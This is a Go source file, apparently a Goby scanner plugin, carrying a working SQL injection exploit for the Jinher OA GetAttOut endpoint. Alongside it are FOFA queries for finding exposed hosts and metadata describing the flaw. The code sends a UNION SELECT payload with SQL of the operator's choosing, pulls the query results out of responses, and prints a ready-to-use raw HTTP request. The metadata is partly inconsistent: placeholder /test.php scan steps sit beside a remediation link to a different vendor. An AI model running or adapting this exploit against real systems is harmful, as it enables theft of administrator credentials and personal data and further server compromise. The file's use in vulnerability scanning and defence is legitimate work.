package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Jinher-OA /jc6/JHSoft.WCF/TEST/GetAttOut SQL Injection Vulnerability",
    "Description": "<p>Jinhe Network is a professional information service provider, providing Internet + regulatory solutions for urban regulatory departments, and providing organizational collaborative OA system development platform, e-government integration platform, smart e-commerce platform and other services for enterprises and institutions.</p><p>Jinhe OA /jc6/JHSoft.WCF/TEST/GetAttOut has SQL injection vulnerabilities. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, user personal information of the site), attackers can even In the case of high permissions, you can write Trojans to the server to further obtain server system permissions.</p>",
    "Product": "Jinher-OA",
    "Homepage": "http://www.jinher.com/",
    "DisclosureDate": "2024-06-19",
    "PostTime": "2024-06-24",
    "Author": "Town",
    "FofaQuery": "title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\") || header=\"Path=/jc6\" || (body=\"JC6金和协同管理平台\" && body=\"src=\\\"/jc6/platform/\") || body=\"window.location = \\\"JHSoft.MobileApp/Default.htm\\\";\" || banner=\"Path=/jc6\"",
    "GobyQuery": "title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\") || header=\"Path=/jc6\" || (body=\"JC6金和协同管理平台\" && body=\"src=\\\"/jc6/platform/\") || body=\"window.location = \\\"JHSoft.MobileApp/Default.htm\\\";\" || banner=\"Path=/jc6\"",
    "Level": "2",
    "Impact": "<p>Jinhe OA /jc6/JHSoft.WCF/TEST/GetAttOut has SQL injection vulnerabilities. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, user personal information of the site), attackers can even In the case of high permissions, you can write Trojans to the server to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.zbintel.com/\">http://www.zbintel.com/</a></p><p>2. Deploy the Web application firewall to monitor the database operation.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "select",
            "value": "@@VERSION,DB_NAME()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "金和OA /jc6/JHSoft.WCF/TEST/GetAttOut SQL 注入漏洞",
            "Product": "金和网络-金和OA",
            "Description": "<p>金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。<br></p><p>金和OA /jc6/JHSoft.WCF/TEST/GetAttOut&nbsp;存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.jinher.com/\">http://www.jinher.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>金和OA /jc6/JHSoft.WCF/TEST/GetAttOut 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Jinher-OA /jc6/JHSoft.WCF/TEST/GetAttOut SQL Injection Vulnerability",
            "Product": "Jinher-OA",
            "Description": "<p>Jinhe Network is a professional information service provider, providing Internet + regulatory solutions for urban regulatory departments, and providing organizational collaborative OA system development platform, e-government integration platform, smart e-commerce platform and other services for enterprises and institutions.</p><p>Jinhe OA /jc6/JHSoft.WCF/TEST/GetAttOut has SQL injection vulnerabilities. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, user personal information of the site), attackers can even In the case of high permissions, you can write Trojans to the server to further obtain server system permissions.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.zbintel.com/\">http://www.zbintel.com/</a></p><p>2. Deploy the Web application firewall to monitor the database operation.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>Jinhe OA /jc6/JHSoft.WCF/TEST/GetAttOut has SQL injection vulnerabilities. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, user personal information of the site), attackers can even In the case of high permissions, you can write Trojans to the server to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10963"
}`

	sendPayload_m8tisPmB7F7qeBHMPg82p07hJk5hcRbw := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewPostRequestConfig("/jc6/JHSoft.WCF/TEST/GetAttOut")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		payloadConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadConfig.Data = "1' union select null,null," + sql + ",null,null,null--"

		resp, err := httpclient.DoHttpRequest(hostInfo, payloadConfig)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		if !strings.Contains(resp.Utf8Html, "\"success\":\"1\"") && !strings.Contains(resp.Utf8Html, "\"attOEndTime\":") {
			return nil, errors.New("SELECT Fail")
		}
		return resp, err

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload_m8tisPmB7F7qeBHMPg82p07hJk5hcRbw
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `@@version`
			_, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/jc6/JHSoft.WCF/TEST/GetAttOut`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload_m8tisPmB7F7qeBHMPg82p07hJk5hcRbw
			makeRegularAAAA := func(RegularContent string, RegularUrl string) (string, error) {
				reRequestAAAA := regexp.MustCompile(RegularUrl)
				if !reRequestAAAA.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequestAAAA.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			if attackType == "sql" {
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				respResult, err := makeRegularAAAA(resp.Utf8Html, `"attOEndTime":"([^"]*)"`)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = respResult
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayload(expResult.HostInfo, "@@VERSION")
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `GET /jc6/JHSoft.WCF/TEST/GetAttOut HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 52
Content-Type:application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Connection: close

1' union select null,null,` + sql + `,null,null,null--`
			}
			return expResult
		},
	))
}
